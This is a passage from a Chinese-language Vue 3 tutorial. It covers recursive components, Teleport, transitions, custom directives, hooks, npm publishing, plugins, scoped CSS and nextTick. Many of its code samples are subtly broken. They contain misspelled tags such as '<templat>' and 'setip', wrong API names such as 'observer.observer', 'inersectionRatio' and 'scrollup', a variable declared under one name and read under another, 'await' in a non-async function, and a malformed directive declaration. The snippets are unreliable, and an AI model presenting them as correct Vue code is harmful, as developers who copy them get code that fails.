defineProps&lt;Props&lt;TreeList&gt;&gt;();&lt;/script&gt; 递归组件事件 可以对递归组件定义事件，此时需要注意事件冒泡的影响： 1234567891011121314151617181920212223242526272829&lt;!-- Tree.vue --&gt;&lt;templat&gt; &lt;!-- 此处注意阻止组件事件冒泡，或者在父组件使用代理来处理组件点击事件 --&gt; &lt;div @click.stop=&#x27;clickTap(item, $event)&#x27; class=&quot;tree&quot; v-for=&quot;item in data&quot;&gt; &lt;input type=&quot;checkbox&quot;&gt; &lt;span&gt;&#123;&#123; item.name &#125;&#125;&lt;/span&gt; &lt;!-- 使用name调用组件自身 --&gt; &lt;tree v-if=&quot;item?.children?.length&quot; :data=&quot;item.children&quot;&gt;&lt;/tree&gt; &lt;/div&gt;&lt;/templat&gt;&lt;script setip lang=&#x27;ts&#x27;&gt; &lt;!-- 使用defineOptions定义组件name --&gt; defineOptions(&#123; name: &quot;tree&quot; &#125;) type TreeList = &#123; name: string; icon?: string; children?: TreeList[] | []; &#125;; type Props&lt;T&gt; = &#123; data?: T[] | []; &#125;; defineProps&lt;Props&lt;TreeList&gt;&gt;(); const clickTap = (item: Tree, e) =&gt; &#123; console.log(item) console.log(e.target) &#125;&lt;/script&gt; 传送组件Teleport Teleport组件可以将其内部的组件通过一个css选择器，传送到所选择的元素内： to属性接收一个css选择器字符串 disable接收一个boolean值控制传送的开启和关闭 123&lt;Teleport :disable=&quot;false&quot; :to=&quot;body&quot;&gt; &lt;A&gt;&lt;/A&gt;&lt;/Teleport&gt; 动画组件Transition transition可以给以下情况添加过度动画： v-if v-show 动态组件 组件根节点 基本用法 transition提供一个name属性，该属性用于将组件与css样式相对应，该组件提供6个默认对应的样式命名： v-enter-from：定义进入过渡的开始状态。在元素被插入之前生效，在元素被插入之后的下一帧移除。 v-enter-active：定义进入过渡生效时的状态。在整个进入过渡的阶段中应用，在元素被插入之前生效，在过渡/动画完成之后移除。这个类可以被用来定义进入过渡的过程时间，延迟和曲线函数。 v-enter-to：定义进入过渡的结束状态。在元素被插入之后下一帧生效 (与此同时 v-enter-from 被移除)，在过渡/动画完成之后移除。 v-leave-from：定义离开过渡的开始状态。在离开过渡被触发时立刻生效，下一帧被移除。 v-leave-active：定义离开过渡生效时的状态。在整个离开过渡的阶段中应用，在离开过渡被触发时立刻生效，在过渡/动画完成之后移除。这个类可以被用来定义离开过渡的过程时间，延迟和曲线函数。 v-leave-to：离开过渡的结束状态。在离开过渡被触发之后下一帧生效 (与此同时 v-leave-from 被移除)，在过渡/动画完成之后移除。 例如定义一个组件： 1234&lt;button @click=&#x27;flag = !flag&#x27;&gt;切换&lt;/button&gt;&lt;transition name=&#x27;fade&#x27;&gt; &lt;div v-if=&#x27;flag&#x27; class=&quot;box&quot;&gt;&lt;/div&gt;&lt;/transition&gt; 则对应的css动画就可以这样设置： 1234567891011121314151617181920212223242526272829303132//开始过度.fade-enter-from&#123; background:red; width:0px; height:0px; transform:rotate(360deg)&#125;//开始过度了.fade-enter-active&#123; transition: all 2.5s linear;&#125;//过度完成.fade-enter-to&#123; background:yellow; width:200px; height:200px;&#125;//离开的过度.fade-leave-from&#123; width:200px; height:200px; transform:rotate(360deg)&#125;//离开中过度.fade-leave-active&#123; transition: all 1s linear;&#125;//离开完成.fade-leave-to&#123; width:0px; height:0px;&#125; 结合第三方动画库 除了默认的样式匹配方式，还可以通过props来自定义动画和css样式的对应关系，这样可以方便我们使用第三方动画库： enter-from-class enter-active-class enter-to-class leave-from-class leave-active-class leave-to-class 12345678&lt;template&gt; &lt;transition enter-active-class=&quot;animate__animated animate__bounceInLeft&quot; name=&#x27;fade&#x27;&gt; &lt;div v-if=&#x27;flag&#x27; class=&quot;box&quot;&gt;&lt;/div&gt; &lt;/transition&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt; import &#x27;animate.css&#x27;&lt;/script&gt; 也可以设置动画进入和离开的持续时间： 1234&lt;transition :duration=&quot;1000&quot;&gt;...&lt;/transition&gt; &lt;transition :duration=&quot;&#123; enter: 500, leave: 800 &#125;&quot;&gt;...&lt;/transition&gt; transition包含8个生命周期 12345678@before-enter=&quot;beforeEnter&quot; //对应enter-from@enter=&quot;enter&quot;//对应enter-active@after-enter=&quot;afterEnter&quot;//对应enter-to@enter-cancelled=&quot;enterCancelled&quot;//显示过度打断@before-leave=&quot;beforeLeave&quot;//对应leave-from@leave=&quot;leave&quot;//对应enter-active@after-leave=&quot;afterLeave&quot;//对应leave-to@leave-cancelled=&quot;leaveCancelled&quot;//离开过度打断 当只用 JavaScript 过渡的时候，在 enter 和 leave 钩子中必须使用 done 进行回调 回调函数将会在这一生命结束前被调用 结合gsap 动画库使用 GreenSock 1234567891011121314151617181920212223242526272829&lt;script setup lang=&quot;ts&quot;&gt;import &#123;ref&#125; from &#x27;vue&#x27;import gsap from &#x27;gsap&#x27;const BeforeEnter = (el: Element) =&gt; &#123; console.log(&#x27;进入之前from&#x27;, el); gsap.set(el, &#123; width: 0, height: 0 &#125;)&#125;const Enter = (el: Element,done: gsap.Callback) =&gt; &#123; console.log(&#x27;过度曲线&#x27;); gsap.to(el, &#123; width: 200px, height: 200px, onComplete: done &#125;)&#125;const AfterEnter = (el: Element) =&gt; &#123; console.log(&#x27;to&#x27;);&#125;const EnterCanceller = (el: Element) =&gt; &#123; console.log(&#x27;过度效果被打断&#x27;);&#125;&lt;/script&gt;&lt;template&gt; &lt;transition @before-enter=&quot;BeforeEnter&quot; @enter=&quot;Enter&quot; @after-enter=&quot;AfterEnter&quot; @enter-cancelled=&quot;EnterCancelled&quot;&gt; &lt;/transition&gt;&lt;/template&gt; apper属性 通过这个属性可以设置初始节点过度 就是页面加载完成就开始动画 对应三个状态 12&lt;transition appear appear-active-class=&quot;from&quot; appear-from-class=&quot;active&quot; appear-to-class=&quot;to&quot;&gt;&lt;/transition&gt; 过度列表transition-group 用法和transition几乎相同，用于渲染整个列表 默认情况下，它不会渲染一个包裹元素，但是你可以通过 tag attribute 指定渲染一个元素。 过渡模式不可用，因为我们不再相互切换特有的元素。 内部元素总是需要提供唯一的 key attribute 值。 CSS 过渡的类将会应用在内部的元素中，而不是这个组/容器本身。 使用move-class制作的洗牌动画： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;template&gt; &lt;div&gt; &lt;button @click=&quot;shuffleMatrix&quot;&gt;shuffle&lt;/button&gt; &lt;transition-group move-class=&quot;ender-shuffleWraps--moveAnimate&quot; class=&quot;ender-shuffleWraps&quot; tag=&quot;div&quot;&gt; &lt;div class=&quot;ender-shuffleWraps__items&quot; v-for=&quot;item in list&quot; :key=&quot;item.id&quot;&gt; &#123;&#123;item.number&#125;&#125; &lt;/div&gt; &lt;/transition-group&gt; &lt;/div&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt;import &#123; ref, reactive&#125; from &#x27;vue&#x27;import _ from &#x27;lodash&#x27;// 利用Array.apply生成一个长度为81,且值初始化为undefined的数组const list = ref(Array.apply(null, &#123;length: 81&#125; as number[]).map((_, index) =&gt; &#123; return &#123; id: index, number: (index % 9) + 1 &#125;&#125;))const shuffleMatrix = () =&gt; &#123; list.value = _.shuffle(list.value)&#125;&lt;/script&gt;&lt;style lang=&quot;scss&quot;&gt;@include b(shuffleWraps) &#123; display: flex; flex-wrap: wrap; width: calc(20px * 9 + 18px); @include e(items) &#123; width: 20px; height: 20px; background: #ccc; display: flex; justify-content: center; align-items: center; font-size: 20px; margin: 1px; &#125; @include m(moveAnimate) &#123; transition: all 0.3s; &#125;&#125;&lt;/style&gt; 自定义指令 Vue中提供了v-for，v-if等等指令同时也支持自定义指令，自定义指令属于破坏性更新 Vue3的自定义指令也包含一些钩子函数 Vue3指令钩子函数 Vue3的自定义指令钩子函数与Vue3组件生命周期相同 created 元素初始化的时候 beforeMount 指令绑定到元素后调用 只调用一次 mounted 元素插入父级dom调用 beforeUpdate 元素（虚拟DOM）被更新之前调用 update 这个周期方法被移除 改用updated beforeUnmount 在元素被移除前调用 unmounted 指令被移除后调用 只调用一次 而Vue2中指令生命周期为：bind，inserted，update，componentUpdate，unbind 自定义指令钩子函数 首先可以在setup语法糖中声明局部自定义指令： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;tmplate&gt; &lt;div&gt; &lt;button @click=&quot;flg = !flg&quot;&gt; 切换状态 &lt;/button&gt; &lt;!-- 使用自定义钩子 --&gt; &lt;!-- 自定义钩子同样允许自定义参数，以及自定义修饰符 --&gt; &lt;A v-if=&quot;flg&quot; v-move:aaa.ender=&quot;&#123;background: &#x27;red&#x27;&#125;&quot;&gt;&lt;/A&gt; &lt;/div&gt;&lt;/tmplate&gt;&lt;script setup lang=&quot;ts&quot;&gt; import A from &quot;./components/A.vue&quot; import &#123;ref, Directive, DirectiveBinding&#125; from &quot;vue&quot; let flg = ref&lt;boolean&gt;(true) type Dir =&#123; background: string &#125; // 自定义指令的命名必须以v开头 // 类型为Directive const vMove:Directive = &#123; // 传入自定义钩子的参数在所有生命周期函数中都能作为参数接收到 created() &#123; console.log(&quot;========&gt;created&quot;) &#125;, beforeMount() &#123; console.log(&quot;========&gt;beforeMount&quot;) &#125;, // 接收到的参数以及修饰符都包含在DirectiveBinding类型中，该类型接收一个泛型辅助推导 mounted(el:HTMLElement, dir:DirectiveBinding&lt;Dir&gt;) &#123; console.log(&quot;========&gt;mounted&quot;) el.style.background = dir.value.background &#125;, beforeUpdate() &#123; console.log(&quot;========&gt;beforeUpdate&quot;) &#125;, updated() &#123; console.log(&quot;========&gt;updated&quot;) &#125;, beforeUnmount() &#123; console.log(&quot;========&gt;beforeUnmount&quot;) &#125;, unmount() &#123; console.log(&quot;========&gt;unmount&quot;) &#125; &#125;&lt;/script&gt;&lt;style scoped&gt; .A &#123; width: 200px; height: 200px; border: 1px solid #ccc; &#125;&lt;/style&gt; 函数简写 当并不需要自定义指令的全部钩子函数时，可以使用函数简写使用部分钩子函数 例如下面这个使用自定义指令实现按钮级的鉴权功能的案例： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;tmplate&gt; &lt;div class=&quot;btns&quot;&gt; &lt;button v-has-show=&quot;shope:edit&quot;&gt;创建&lt;/button&gt; &lt;button v-has-show=&quot;shope:create&quot;&gt;编辑&lt;/button&gt; &lt;button v-has-show=&quot;shope:delete&quot;&gt;删除&lt;/button&gt; &lt;/div&gt;&lt;/tmplate&gt;&lt;script setip lang=&quot;ts&quot;&gt; import &#123;ref, reactive&#125; from &quot;vue&quot; import type &#123;Directive&#125; from &quot;vue&quot; // 模拟用户ID存储 localStorage.setItem(&#x27;userId&#x27;, &#x27;ender&#x27;) // mock后台返回的数据 // 此处使用京东标准，ID:页面:权限 const permission = [ &#x27;ender:shope:edit&#x27;, &#x27;ender:shope:create&#x27;, &#x27;ender:shope:delete&#x27; ] // 取出用户ID const userId = localStorage.getItem(&#x27;userId&#x27;) as string // 创建自定义指令 // 函数式自定义指令，接收两个参数el和binding，分别代表被指令绑定的DOM元素，以及指令绑定的值 // 可以通过Directive接收的两个泛型指定类型 const vHasShow:Directive&lt;HTMLElement, string&gt;(el, binding) &#123; // 拼接得到用户权限信息字符串 if(!permission.includes(userId + &quot;:&quot; + binding.value)) &#123; el.style.display = &#x27;none&#x27; &#125; &#125;&lt;/script&gt;&lt;style scope lang=&#x27;less&#x27;&gt; .btns&#123; button &#123; margin: 10px &#125; &#125;&lt;/style&gt; 自定义指令实现图片懒加载 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;tmplate&gt; &lt;div&gt; &lt;div&gt; &lt;img v-lazy=&quot;item&quot; v-for=&quot;item in arr&quot; width=&quot;360&quot; height=&quot;500&quot; alt=&quot;&quot;&gt; &lt;/div&gt; &lt;/div&gt;&lt;/tmplate&gt;&lt;script setup lang=&quot;ts&quot;&gt; import &#123;ref, reactive&#125; from &quot;vue&quot; import type &#123; Directive &#125; from &quot;vue&quot; // 使用vue提供的函数批量引入图片 // meta找有两个方法:glob和globEager // glob是懒加载的，返回的是一个函数，import语句用于函数会触发代码分包 // let modules = &#123;&quot;xxx&quot;: ()=&gt; import(&quot;xxx&quot;)&#125; // globEager为静态加载 // import xxx from &#x27;xxx&#x27; // 使用TS中的Record工具定义一个对象类型，接收两个泛型，分别表示key和value的类型 let imgList:Record&lt;string, &#123; default: string &#125;&gt; = import.meta.glob(&#x27;./assets/images/*.*&#x27;) let arr = Object.values(imageList).map((v) =&gt; v.default) // 自定义指令 const vLazy:Directive&lt;HTMLImgElement, string&gt; = async (el, binding) =&gt; &#123; // 加载默认显示的图片 const def = await import(&#x27;./assets/vue.svg&#x27;) el.src = def.default // 借助js新增的IntersectionObserver方法监听元素是否出现在可视窗内 const observer = new IntersectionObserver((enr) =&gt; &#123; // 回调函数返回一个entrece数组，取其第一个元素 // inersectionRatio为一个number变量，用于记录元素在可视窗口中的比例 if(enr[0].inersectionRatio &gt; 0) &#123; // 出现在视窗中则需要加载真正的图片 el.src = binding.value // 赋值完成后停止监听避免反复加载 observer.unobserver(el) &#125; &#125;) // 开启事件监听 observer.observer(el) &#125;&lt;/script&gt;&lt;style scoped lang=&quot;less&quot;&gt;&lt;/style&gt; 自定义hooks hook即将文件的一些单独功能的js代码抽离出来进行封装的方式，是函数的一种写法。 vue2中使用mixin来实现类似的功能但不同的是hook是函数，mixin返回的是一个对象 hook的经典应用案例是Vue3 hook 库Get Started | VueUse 下面以一个实现图片转base64的功能演示hook的使用 123456789101112131415161718192021222324252627282930313233import &#123; onMounted &#125; from &quot;vue&quot;;type Options = &#123; el: string // 用与检索图片标签的字符串&#125;type Return = &#123; baseURL: string | null&#125;export default function(options: Options): Promise&lt;Return&gt; &#123; const toBase64 = (el: HTMLImageElement):string =&gt; &#123; // TODO: 创建canvas对象将图像画进去后利用toDataURL方法转base64编码 const canvas: HTMLCanvasElement = document.createElement(&#x27;canvas&#x27;) const ctx = canvas.getContext(&#x27;2d&#x27;) as CanvasRenderingContext2D canvas.width = el.width canvas.height = el.height ctx.drawImage(el, 0, 0, canvas.width, canvas.height) return canvas.toDataURL(&#x27;image/png&#x27;) &#125; return new Promise((resolve) =&gt; &#123; onMounted(() =&gt; &#123; const file: HTMLImageElement = document.querySelector(options.el) as HTMLImageElement file.onload = (): void =&gt; &#123; resolve(&#123; baseURL: toBase64(file) &#125;) &#125; &#125;) &#125;)&#125; 接下来只需要在组件中引入并使用即可 12345678910111213&lt;template&gt; &lt;img id=&quot;img&quot; width=&quot;300&quot; height=&quot;300&quot; src=&quot;./img/test.png&quot; /&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt; import useImageToBase64 from &quot;./hooks&quot; useImageToBase64(&#123;el: &quot;#img&quot;&#125;).then((res) =&gt; &#123; console.loh(res.baseURL) &#125;)&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 自定义hook与自定义指令组合 下面通过一个案例来熟悉vite打包，自定义hook自定义指令以及如何发布到npm 项目构建 首先构建项目，创建src文件，在其下方创建index.ts入口，随后创建README 然后使用如下命令生成package.json 1pnpm init 接着使用如下命令生成ts配置文件 1tsc --init 然后创建一个vite.config.ts文件作为vite的配置文件 创建一个index.d.ts文件用来编写声明文件 编写库功能 随后就可以开始在index.ts中编写内容了： 12345678910111213141516171819202122232425262728293031import type &#123;App&#125; from &quot;vue&quot;// mutationObserver 主要侦听子集变化，包括属性变化以及增删改查// interSectionObserver 主要侦听元素是否在视口内// ResizeObserver 主要侦听元素宽高变化function useResize(el: HTMLElement, callBack: Function) &#123; let resize = new ResizeObserver((entries) =&gt; &#123; // 由于可以监听多个元素，所以entries是一个数组，此处我们只监听一个元素 // contentRect包含变化前后的宽高 callBack(entries[0].contentRect) &#125;) // 添加侦听元素 resize.observe(el)&#125;// TODO: vue插件规范，需要实现install方法// 改方法接收app作为参数// 这样app实例就可以通过app.use(router)这样的形式使用const install = (app: App) =&gt; &#123; // 通过directive添加自定义指令 app.directive(&quot;resize&quot;, &#123; mounted(el, binding) &#123; useResize(el, binding.value) &#125; &#125;)&#125;useResize.install = install// 将函数导出，就实现了自定义hook的效果export default useResize 使用vite打包 接着在vite中配置该库打包时要用到的一些信息： 12345678910111213141516171819202122232425import &#123; defineConfig &#125; from &quot;vite&quot;// 默认打包一个UMD和一个es module// umd支持amd cmd cjs 全局变量模式export default defineConfig(&#123; build: &#123; lib: &#123; // 库入口文件地址 entry: &quot;src/index.ts&quot;, // 库名称 name: &quot;useResize&quot;, &#125;, // 属性透传 rollupOptions: &#123; // 确保外部化处理不想打包进库的依赖 external: [&#x27;vue&#x27;], output: &#123; // 在UMD模式下为这些外部化的依赖提供一个全局变量 globals: &#123; useResize: &quot;useResize&quot; &#125; &#125; &#125; &#125;&#125;) 接下来在package.json中添加一个打包的命令： 123456&#123; &quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;, &quot;build&quot;: &quot;vite build&quot; &#125;&#125; 然后呢使用如下命令进行打包： 1npm run build 就会看到多了一个dist文件夹，其中ts代码被编译为了mjs以及umd形式的两个js文件 发布到npm 在将库发布到npm之前我们需要对我们的库做一些声明，在index.d.ts中编写声明： 1234567// 声明文件declare const useResize: &#123; (el: HTMLElement, callBack: Function): void; install: (app: App) =&gt; void;&#125;export default useResize 最后，在发布之前还需要再package.json中配置一些发布时需要设计到的信息： 配置库作为全局变量被引入的js文件入口“main” 配置库作为es module被引入时的js文件入口“module” 配置上传到npm时要上传的文件“file” 1234567891011&#123; &quot;main&quot;: &quot;dist/ender-vue-resize.umd.js&quot;, &quot;module&quot;: &quot;dist/ender-vue-resize.mjs&quot;, &quot;files&quot;: [ &quot;dist&quot;, &quot;index.d.ts&quot; ],&#125; 之后使用如下命令进行发布： 123npm adduser # 注册一个npm账号npm login # 登录npm账号npm publish # 发布 全局函数以及全局变量 在vue2中使用Prototype来增加全局函数或全局变量，但vue3中已经不再使用这一方法了 vue3中通过createApp生成vueApp实例对象，则可以通过以下方式添加全局函数以及全局变量 12345678910111213141516171819202122// vue2.xVue.Prototype.$http = () =&gt; &#123;&#125;// vue3.xapp = createApp(App)app.config.globalProperties.$env = &quot;dev&quot;app.config.globalProperties.$filter = &#123; format&lt;T&gt; (str: T) &#123; return `Ender-$&#123;str&#125;` &#125;&#125;// 定义好之后需要扩充vue的声明，防止编辑器报错type Filter = &#123; format&lt;T&gt; (str: T):string&#125;declare module &quot;vue&quot; &#123; export interface ComponentCustomProperties &#123; $filter: Filter, $env: string &#125;&#125; 使用时直接在html中或在script中调用即可： 1234567891011121314&lt;template&gt;&lt;div&gt; &#123;&#123;$env&#125;&#125;&lt;/div&gt;&lt;div&gt; &#123;&#123;$filter.format(&quot;World&quot;)&#125;&#125;&lt;/div&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt; import &#123;getCurrentInstance&#125; from &quot;vue&quot; // js中需要先获取当前app实例，再从当前实例的proxy中得到全局变量/方法 const app = getCurrentInstance() console.log(app?.proxy?.$env)&lt;/script&gt; Vue编写插件 使用vue编写插件时需要经过以下步骤： 编写用作插件的vue组件，并将方法通过defineExpose暴露 编写ts以对象或函数的形式将vue组件导出 以对象形式导出时要求在对象中实现install函数 install函数主要完成以下几个步骤： 使用createVNode方法，根据vue组件创建虚拟DOM节点VNode 使用render方法将虚拟DOM挂在到指定DOM节点 如果组件有暴露方法则将方法注册为Vue全局函数或全局变量 在main.ts中引入组件，并使用app.use安装编写的插件 为了使用方便，需要在main.ts中拓展vue的声明 index.vue 12345678910111213141516171819202122232425262728293031323334353637383940&lt;template&gt; &lt;div v-if=&quot;isShow&quot; class=&quot;ender-loading&quot;&gt; &lt;div class=&quot;ender-loading__content&quot;&gt;Loading...&lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt; import &#123; ref &#125; from &#x27;vue&#x27;; const isShow = ref(false) // 控制显示 console.log(isShow) const show = () =&gt; &#123; isShow.value = true &#125; const hide = () =&gt; &#123; isShow.value = false &#125; // 暴露组件方法 defineExpose(&#123; isShow, show, hide &#125;)&lt;/script&gt;&lt;style lang=&quot;scss&quot; scoped&gt; @include b(loading) &#123; position: fixed; inset: 0; background-color: rgba(0, 0, 0, 0.8); display: flex; justify-content: center; align-items: center; @include e(content) &#123; font-size: 30px; color: #fff; &#125; &#125;&lt;/style&gt; index.ts 1234567891011121314151617181920import &#123; createVNode, App, VNode, render &#125; from &quot;vue&quot;;import Loading from &quot;./index.vue&quot;// 以对象形式导出作为插件时需要实现install方法export default &#123; // install方法接收app实例对象 install(app: App) &#123; // 将组件创建为虚拟DOM节点 const vNode: VNode = createVNode(Loading) console.log(vNode) // 使用render方法将虚拟DOM挂在到指定元素中 // 此处由于是全局loading则挂在到body上 render(vNode, document.body) // 将组件方法配置为全局方法 app.config.globalProperties.$loading = &#123; show: () =&gt; vNode.component?.exposed?.show(), hide: () =&gt; vNode.component?.exposed?.hide() &#125; &#125;&#125; main.ts 123456789101112131415161718192021222324import &#123; createApp &#125; from &#x27;vue&#x27;import &#x27;./style.css&#x27;import App from &#x27;./App.vue&#x27;import Loading from &#x27;./components/Loading&#x27;let app = createApp(App)// 使用use方法安装插件app.use(Loading)// 自定义插件需要进行拓展声明才能有代码提示type Lod = &#123; show: () =&gt; void, hide: () =&gt; void&#125;declare module &#x27;@vue/runtime-core&#x27; &#123; export interface ComponentCustomProperties &#123; $loading: Lod &#125;&#125;app.mount(&#x27;#app&#x27;) 使用 12345678910111213141516171819202122232425262728293031&lt;template&gt; &lt;Layout&gt;&lt;/Layout&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt;import &#123; ref, reactive, getCurrentInstance &#125; from &#x27;vue&#x27;import Layout from &quot;./Layout/index.vue&quot;const instance = getCurrentInstance()instance?.proxy?.$loading.show()setTimeout(() =&gt; &#123; instance?.proxy?.$loading.hide()&#125;, 2000)&lt;/script&gt;&lt;style lang=&quot;scss&quot;&gt;* &#123; margin: 0; padding: 0;&#125;html, body &#123; width: 100%; height: 100%;&#125;#app &#123; @include bfc;&#125;&lt;/style&gt; app.use手撕 1234567891011121314151617181920212223import &#123; App &#125; from &quot;vue&quot;;import app from &quot;../main&quot;;import &#123; isFunction &#125; from &quot;lodash&quot;;interface Use &#123; install: (app: App, ...options: any[]) =&gt; void&#125;// set防止重复注册const installList = new Set()export function MyUseM&lt;T extends Use&gt;(plugin: T, ...options: any[]) &#123; if(installList.has(plugin)) &#123; console.error(&quot;插件已注册过&quot;) &#125; else if(plugin &amp;&amp; isFunction(plugin.install)) &#123; installList.add(plugin) plugin.install(app, ...options) &#125; else if(isFunction(plugin)) &#123; installList.add(plugin) plugin(app, ...options) &#125; // 链式调用 return app&#125; UI组件库 ElementUI 样例使用ts，setup语法糖编写 表单需要自己写分页 Ant Design 样例使用ts，setup函数编写 表单包含分页 View Design 样例使用js，选项式API Vant 移动端UI，支持小程序、vue2、vue3、react 样例使用setup函数模式 包含很多业务组件（地址，联系人编辑等等 提供了很多自定义hook 属性透传 在使用ElementUI时，由于Vue中Scoped的存在，阻止了css样式的向外传播。 由于单页应用会将所有Vue组件合并为一个HTML，因此为了保证css之间互相不影响。vue可以为vue组件中的style标签加scope scope通过为DOM结构以及css样式上添加唯一不重复的标识：data-v-hash（通过PostCSS转译实现），以保证唯一性 总结scoped的三条渲染规则： 给HTML中的DOM节点加一个不重复的data属性：（data-v-123)来进行区分 给每个css选择器的末尾加上当前组件的属性选择器[data-v-123] 如果组件内部包含其他组件，则只会给其他组件的最外层标签加上当前组件的data属性 但使用ElementUI时，通常会希望自定义一些样式，因此vue提供了:deep，他的作用就是用来改变属性选择器的位置 以下代码会将[data-v-123]属性选择器加在最外层属性ender-content__input上，如果不使用deep则会加在 ender-content__input input上 1234567891011121314151617181920212223242526272829303132&lt;template&gt; &lt;div class=&quot;ender-content&quot;&gt; &lt;div class=&quot;ender-content__item&quot;&gt; &lt;el-input class=&quot;ender-content__input&quot;&gt;&lt;/el-input&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;style scoped lang=&quot;scss&quot;&gt;@include b(content) &#123; flex: 1; background-color: #fff; overflow: auto; overflow-y: hidden; padding: 0 10px; display: flex; flex-direction: column; @include e(item) &#123; flex: 1; overflow: auto; border-bottom: 1px solid #ccc; padding: 10px; &#125; @include e(input) &#123; // vue2 中使用 /deep/ // vue3 中也可以使用，但是会报错 :deep(input)&#123; background: red; &#125; &#125;&#125;&lt;/style&gt; Vue3 Style新特性 插槽选择器 当我们使用插槽时，想要为插入的内容添加样式： A组件接收一个插槽 1234567891011121314&lt;template&gt; &lt;div&gt; 我是插槽 &lt;slot&gt;&lt;/slot&gt; &lt;/div&gt;&lt;/template&gt; &lt;script&gt;export default &#123;&#125;&lt;/script&gt; &lt;style scoped&gt; &lt;/style&gt; 在App.vue中引入，并向插槽中插入div 1234567891011121314&lt;template&gt; &lt;div&gt; &lt;A&gt; &lt;div class=&quot;a&quot;&gt;私人定制div&lt;/div&gt; &lt;/A&gt; &lt;/div&gt;&lt;/template&gt; &lt;script setup&gt;import A from &quot;@/components/A.vue&quot;&lt;/script&gt; &lt;style lang=&quot;less&quot; scoped&gt;&lt;/style&gt; 接着使用:slotted来修饰类选择器 123456&lt;style scoped&gt; :slotted(.a) &#123; color:red&#125;&lt;/style&gt; 全局选择器 如果想要添加全局样式，在vue2中则需要去掉style标签中的scoped vue3中只需要使用global修饰即可 12345&lt;style lang=&quot;less&quot; scoped&gt;:global(div)&#123; color:red&#125;&lt;/style&gt; 动态css 单文件组件的style标签可以通过v-bind将响应式对象绑定为css属性值 1234567891011121314151617&lt;template&gt; &lt;div class=&quot;div&quot;&gt; 小满是个弟弟 &lt;/div&gt;&lt;/template&gt; &lt;script lang=&quot;ts&quot; setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;const red = ref&lt;string&gt;(&#x27;red&#x27;)&lt;/script&gt; &lt;style lang=&quot;less&quot; scoped&gt;.div&#123; color:v-bind(red)&#125; &lt;/style&gt; 如果绑定响应式对象中的值为引用类型，则需要使用引号 123456789101112131415161718 &lt;template&gt; &lt;div class=&quot;div&quot;&gt; 小满是个弟弟 &lt;/div&gt;&lt;/template&gt; &lt;script lang=&quot;ts&quot; setup&gt;import &#123; ref &#125; from &quot;vue&quot;const red = ref(&#123; color:&#x27;pink&#x27;&#125;)&lt;/script&gt; &lt;style lang=&quot;less&quot; scoped&gt;.div &#123; color: v-bind(&#x27;red.color&#x27;);&#125;&lt;/style&gt; css module &lt;style module&gt;标签会被编译为 CSS Modules 并且将生成的 CSS 类作为 $style 对象的键暴露给组件 并且支持自定义注入名称&lt;style module=&quot;ender&quot;&gt; 之后可以直接通过:class指令使用（多值可以使用数组接收： 123456789101112131415&lt;template&gt; &lt;div :class=&quot;[ender.red,ender.border]&quot;&gt; Hello World &lt;/div&gt;&lt;/template&gt; &lt;style module=&quot;ender&quot;&gt;.red &#123; color: red; font-size: 20px;&#125;.border&#123; border: 1px solid #ccc;&#125;&lt;/style&gt; 不具名module则通过style使用 123456789101112&lt;template&gt; &lt;div :class=&quot;$style.red&quot;&gt; Hello World &lt;/div&gt;&lt;/template&gt; &lt;style module&gt;.red &#123; color: red; font-size: 20px;&#125;&lt;/style&gt; 注入的类可以通过 useCssModule API 在 setup() 和 &lt;script setup&gt; 中使用。对于使用了自定义注入名称的 &lt;style module&gt; 模块，useCssModule 接收一个对应的 module attribute 值作为第一个参数 123456789101112131415161718192021&lt;template&gt; &lt;div :class=&quot;[ender.red,ender.border]&quot;&gt; Hello World &lt;/div&gt;&lt;/template&gt; &lt;script setup lang=&quot;ts&quot;&gt;import &#123; useCssModule &#125; from &#x27;vue&#x27;const css = useCssModule(&#x27;ender&#x27;)&lt;/script&gt; &lt;style module=&quot;ender&quot;&gt;.red &#123; color: red; font-size: 20px;&#125;.border&#123; border: 1px solid #ccc;&#125;&lt;/style&gt; 使用场景一般用于TSX 和 render 函数 居多 NextTick 在Vue中数据的更新是同步的，但是DOM的更新是异步的 因此当我们实现一个自动滚动到最低部的聊天框这种需要在send按钮点击后操作DOM的场景时，由于send处理函数是同步的，而更新DOM是异步的，因此并不会滚动到我们希望的位置： 12345678910111213import &#123; ref, reactive &#125; from &quot;vue&quot;let chatList = reactive([ &#123;name: &quot;A&quot;, message: &quot;xxxxx&quot;&#125;])let ipt = ref(&quot;&quot;)let box = ref&lt;HTMLDivElement&gt;() // 使用ref绑定的DOM元素const send = () =&gt; &#123; chatList.push(&#123; name: &quot;B&quot;, message: ipt.value &#125;) box.value.scrollup = 9999999 // 当这一步执行时同步的，因此会先滑动到底部，在将新增加的DOM更新到页面上&#125; 因此Vue提供了NextTick API用来解决这样的问题，第一种方式就是回调函数： 123456789101112131415import &#123; ref, reactive &#125; from &quot;vue&quot;let chatList = reactive([ &#123;name: &quot;A&quot;, message: &quot;xxxxx&quot;&#125;])let ipt = ref(&quot;&quot;)let box = ref&lt;HTMLDivElement&gt;() // 使用ref绑定的DOM元素const send = () =&gt; &#123; chatList.push(&#123; name: &quot;B&quot;, message: ipt.value &#125;) nextTick(() =&gt; &#123; box.value.scrollup = 9999999 // 将语句放在nextTick的回调函数中就能解决问题 &#125;)&#125; 也可以使用async/await来实现上述功能 123456789101112131415import &#123; ref, reactive &#125; from &quot;vue&quot;let chatList = reactive([ &#123;name: &quot;A&quot;, message: &quot;xxxxx&quot;&#125;])let ipt = ref(&quot;&quot;)let box = ref&lt;HTMLDivElement&gt;() // 使用ref绑定的DOM元素const send = () =&gt; &#123; chatList.push(&#123; name: &quot;B&quot;, message: ipt.value &#125;) // 这样在await之后的语句都变为异步执行了 await nextTick() box.value.scrollup = 